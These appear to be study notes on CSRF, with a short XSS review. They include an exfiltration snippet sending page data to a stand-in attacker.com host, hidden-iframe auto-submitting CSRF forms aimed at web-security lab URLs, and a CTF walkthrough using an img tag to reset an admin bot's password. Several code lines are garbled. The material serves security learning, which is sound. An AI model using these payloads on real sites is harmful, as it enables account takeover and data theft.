# CSRF (Cross-site request forgery)

## Part 1. Review
1. SQL Injection -> Server side script
2. XSS -> Client side script
```javascript
<iframe id='myFrame' src=="~~mypage.php"></iframe>

<script> var myFrame = document.getElementById('myFrame');
var data = myFrame.contentDocument.getElementBy;
var i = new Image();
i.src = "https://attacker.com/?" + data; </script>
```

## Part 2. CSRF (Cross Site Request Forgery)
- CSRF forces users to execute unwanted actions, while XSS involves injecting malicious scripts into web pages viewed by other users.

1. Where CSRF happen?
- Every request
- Tricks a user into making unwanted actions on a web application in which they are authenticated.
2. POST Method
- form Tag -> XSS
```javascript
<form method="POST" action ="hips:/0a82006504a3000480da178a0027009c.web-security-academy.ne/my-account/change-email">
<input type="text" name="email" value="normal%40test.com"/>
<input type="submit" value="Click Me"> </form>
```
```javascript
<h1>Hello---! </h1>
<form method="POST" action="https://0ae2006504a3dcc480da178a0027009c.web-security-academy.net/my-account/change-email" id="myForm">
<input type="hidden" name="email" value="normal%40test.com"/>
</form>
<script> document.getElementByld("myForm').submit(): </script>
```
```javascript
<h1>Hello---! </h1>
<iframe width="0" height="0" border="0" name="stealthFrame" style="display: none;"> </iframe>
<form method="POST" action="https://0ae2006504a3dcc480da178a0027009c.web-security-academy.net/my-account/change-email"
id="myForm" target="stealthFrame">
<input type="hidden" name="email" value="normal%40test.com"/>
</form>
<script> document.getElementByld("myForm').submit(): </script>
```

## Part 3. CTF = CSRF GET Admin1
- Error = When changing a password on mypage, it shows up "id=&info=&pw=1234"
- Send the mypage to repeater and change the GET method to check the possibility of getting URL
- Create an attack link on the board for the admin to check the memo
- The attack link
```javascript
<img src = "http://ctf.segfaulthub.com:7575/csrf_1/mypage_update.php?id=&info=&pw=1234">
```
- Check the URL including the link to the admin bot
- Log in the admin account

## Part 4. CSRF Token
- A secure random token (e.g., synchronizer token or challenge token) that is used to prevent CSRF attacks
```javascript
<form>
<input type="hidden" name="csrfT0ken" value="secret_key"</form>
```
